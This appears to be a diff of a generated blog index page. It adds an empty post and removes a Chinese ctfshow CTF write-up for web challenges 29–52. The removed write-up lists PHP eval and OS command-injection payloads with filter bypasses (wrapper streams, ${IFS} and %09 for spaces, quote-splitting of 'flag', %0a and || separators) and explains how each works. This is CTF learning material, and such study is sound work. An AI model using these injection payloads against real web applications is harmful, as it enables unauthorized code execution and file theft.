@@ -71,6 +71,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-1234" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/27/1234/" class="article-date">
+  <time class="dt-published" datetime="2025-04-27T01:17:24.000Z" itemprop="datePublished">2025-04-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/27/1234/">1234</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/27/1234/" data-id="cm9yymzok0000n8uob7p9eh7z" data-title="1234" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
@@ -973,55 +1012,6 @@ ASCII*
 
 
   
-    <article id="post-ctfshow web29-52 (部分）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2025-04-13T07:56:57.953Z" itemprop="datePublished">2025-04-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Web29 </p>
-<p><img src="https://i-blog.csdnimg.cn/direct/d998a912ddf44a6dbc2419acbad09518.png" alt="在这里插入图片描述"></p>
-<p>eval函数表示把后面的内容当成php代码执行，</p>
-<ol>
-<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>而不能直接?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 因为后面的内容不是标准的php代码<br>2.?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);<br>3.?c&#x3D;echo `tac fla*&#96;; 注意要用反引号`&#96;包起来 这个反引号代替了system函数</li>
-</ol>
-<p><img src="https://i-blog.csdnimg.cn/direct/3cd6a0560bd24091b97867ab9198c94c.png"></p>
-<p>30 system被过滤也可以用passthru来替代system执行系统命令<br><img src="https://i-blog.csdnimg.cn/direct/456388f310ac4e12bd7b7e76507fef1e.png" alt="在这里插入图片描述"></p>
-<p>31 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；<br>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p>
-<p><img src="https://i-blog.csdnimg.cn/direct/1ba9b4e817914d78b4cefe2d4e453ca6.png" alt="在这里插入图片描述"><br>32  ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?><br>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src="https://i-blog.csdnimg.cn/direct/c2828ed2136d4d778900daca8ea50a36.png" alt="在这里插入图片描述"><br>38看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?><br>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?><br><?= 是简化的 <?php echo ... ?><br><img src="https://i-blog.csdnimg.cn/direct/6c5fc2187d5c49bea88e0282701070b9.png" alt="在这里插入图片描述"><br>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。<br>echo：PHP中的输出函数，用于输出字符串或表达式的结果。<br>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。<br>next：PHP中的函数，用于将内部指针向前移动到下一个元素。<br>array_reverse：PHP中的函数，用于反转数组元素的顺序。<br>scandir：PHP中的函数，用于列出目录中的文件和子目录。<br>pos：PHP中的函数，返回数组中当前内部指针指向的值。<br>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。<br>具体来说，这段代码的执行流程如下：</p>
-<p>localeconv()：获取本地化的数字和货币格式信息。<br>pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。<br>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。<br>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。<br>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。<br>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。<br>echo：输出这个高亮显示的内容。<br>payload2：<br>?c&#x3D;eval(next(reset(get_defined_vars())));&amp;1&#x3D;;system(“tac%20flag.php”);<br>1<br>payload2解释：<br>?c&#x3D;eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p>
-<p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。<br>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。<br>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。<br>eval()：这个函数执行字符串作为PHP代码。<br>这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。</p>
-<p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p>
-<p>system()：这个函数执行一个shell命令，并将完整的输出返回。<br>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。<br>这段代码的目的是尝试执行flag.php文件的反向内容。</p>
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a><br><img src="https://i-blog.csdnimg.cn/direct/ac258928b27c4cd9be04c492d6dd26c9.png" alt="在这里插入图片描述"><br>dev&#x2F;null 2&gt;&amp;1<br>command &gt; &#x2F;dev&#x2F;null ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。<br>command 2&gt; &#x2F;dev&#x2F;null ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。<br>command &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1（等价于 command &amp;&gt; &#x2F;dev&#x2F;null ） ：</p>
-<blockquote>
-<p>先将标准输出重定向到 &#x2F;dev&#x2F;null 。<br>2&gt;&amp;1 中 2 代表标准错误输出，&amp; 表示绑定，1 是标准输出，即把标准错误输出绑定到标准输出，由于标准输出已定向到 &#x2F;dev&#x2F;null ，所以标准错误输出也被定向到 &#x2F;dev&#x2F;null ，命令所有输出都被丢弃。常用于不想看到命令任何输出，或避免输出干扰、减少日志量等场景 。比如在运行一些后台脚本任务时，可让其输出不显示在终端 。<br>解法1 ?c&#x3D;ls;  ?c&#x3D;tac fla.php; ;后面为空，丢进黑洞的就是空 当用户传入 tac flag.php;ls 时，实际执行的命令变为 tac flag.php;ls &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1。此时，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 只对 ls 命令生效，因为它是重定向符号后面紧邻的命令，而 tac flag.php 命令不受影响，其输出会正常显示，从而绕过了 &#x2F;dev&#x2F;null 对输出的屏蔽</p>
-</blockquote>
-<p>解法2 ?c&#x3D;tac flag.php||   逻辑或|| 当有一个为真则为真，A||B 若A为真，则只进行A 不管B<br>解法3  ?c&#x3D;ls%26  &amp;的URL编码是%26    在命令 ls &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 中，重定向操作 &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 是针对 &amp; 之后的部分，而 &amp; 会将 ls 命令放到后台执行，使得 ls 命令独立于重定向操作。也就是说，重定向操作无法影响到已经被放到后台执行的 ls 命令，所以 ls 命令的输出不会被重定向到 &#x2F;dev&#x2F;null，而是正常显示出来。  &amp; 也可以看作是命令分隔符的一种特殊形式。它和分号 ; 类似，都能分隔多个命令，但 &amp; 会让前面的命令在后台运行。<br>?c&#x3D;ls%26%26 同理<br>逻辑与运算符&amp;&amp; 条件1&amp;&amp;条件2 当1为真继续2 若1为假 则2就不管了<br>按位与运算符&amp; 用于对两个整数的二进制位进行逐位比较。只有当两个对应位都为 1 时，结果的该位才为 1，否则为 0。<br>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。<br>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。<br>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p>
-<p><img src="https://i-blog.csdnimg.cn/direct/18552782bc6d444b8c1ce385ad74dd81.png" alt="在这里插入图片描述"><br>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26<br><img src="https://i-blog.csdnimg.cn/direct/79b9fcfb6c3b4524b8f9e2dca5697d42.png" alt="在这里插入图片描述"><br>44 ?c&#x3D;tac fla*||<br><img src="https://i-blog.csdnimg.cn/direct/299950984d2d43f39db7c81e65b3ded5.png" alt="在这里插入图片描述"><br>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||<br><img src="https://i-blog.csdnimg.cn/direct/88dbbbe8445540d3aab25a80fb1bdf77.png" alt="在这里插入图片描述"><br>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格<br>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符<br><img src="https://i-blog.csdnimg.cn/direct/404230580271469196b1a1dc690c13fd.png" alt="在这里插入图片描述"><br>47 ?c&#x3D;tac%09fla?.php||   绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次<br><img src="https://i-blog.csdnimg.cn/direct/8a260c15430a43dd9ef28e74dc0c1e8c.png" alt="在这里插入图片描述"><br>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。<br><img src="https://i-blog.csdnimg.cn/direct/4b4b60de8c4d452583e874bb8ef008fb.png" alt="在这里插入图片描述"><br>50 ?c&#x3D;tac&lt;fla’’g.php||<br><img src="https://i-blog.csdnimg.cn/direct/87c61c55d27043a1b13b887d8bbeebc1.png" alt="在这里插入图片描述"><br>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac<br>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p>
-<p>nl 命令：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。<br>more 命令：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。<br>vi 命令：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。<br><img src="https://i-blog.csdnimg.cn/direct/6512d4273c40450eb778e65c77a34bc2.png" alt="在这里插入图片描述"><br>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" data-id="cm9qgphqq000500uo2lo6et4y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1058,6 +1048,10 @@ ASCII*
       <ul>
         
           <li>
+            <a href="/2025/04/27/1234/">1234</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
           </li>
         
@@ -1071,10 +1065,6 @@ ASCII*
         
           <li>
             <a href="/2025/04/23/%E5%8F%8D%E5%B0%84/">反射</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/">md5强弱碰撞及绕过</a>
           </li>
         
       </ul>
